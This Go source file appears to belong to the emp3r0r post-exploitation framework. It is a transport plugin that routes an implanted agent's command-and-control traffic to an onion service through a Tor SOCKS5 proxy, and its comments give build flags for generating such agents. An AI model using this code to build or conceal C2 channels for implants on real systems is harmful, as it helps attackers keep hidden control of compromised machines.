// Package tor is a worked example of a custom agent transport.
//
// The agent dials the C2's onion service through a local Tor SOCKS5 proxy. The
// transport sees only SecureConn ciphertext, so the bridge and the Tor network
// never see application plaintext.
//
// Build an agent with -tags with_transport_tor, then generate it with
// --c2-channel-mode tor --allow-custom-transport.
package tor

import (
	"context"
	"fmt"
	"io"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/pkg/agenttransport"
	"golang.org/x/net/proxy"
)

// Name is the transport name shared with the C2 bridge.
const Name = "tor"

type dialer struct{}

// Dial connects to target.Address through a SOCKS5 proxy. The proxy defaults to
// target.Proxy, then to 127.0.0.1:9050 when the tor.socks5 option is absent.
func (dialer) Dial(ctx context.Context, target agenttransport.Target) (io.ReadWriteCloser, error) {
	address := strings.TrimSpace(target.Address)
	if address == "" {
		return nil, fmt.Errorf("tor: C2 address is empty")
	}
	if !strings.Contains(address, ":") {
		address += ":80"
	}

	socks := strings.TrimSpace(target.Options["socks5"])
	if socks == "" {
		socks = strings.TrimPrefix(target.Proxy, "socks5://")
	}
	if socks == "" {
		socks = "127.0.0.1:9050"
	}

	base, err := proxy.SOCKS5("tcp", socks, nil, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("tor: create SOCKS5 dialer: %w", err)
	}
	if cd, ok := base.(proxy.ContextDialer); ok {
		return cd.DialContext(ctx, "tcp", address)
	}

	conn, err := base.Dial("tcp", address)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func (dialer) Name() string { return Name }

func init() {
	agenttransport.Register(dialer{})
}
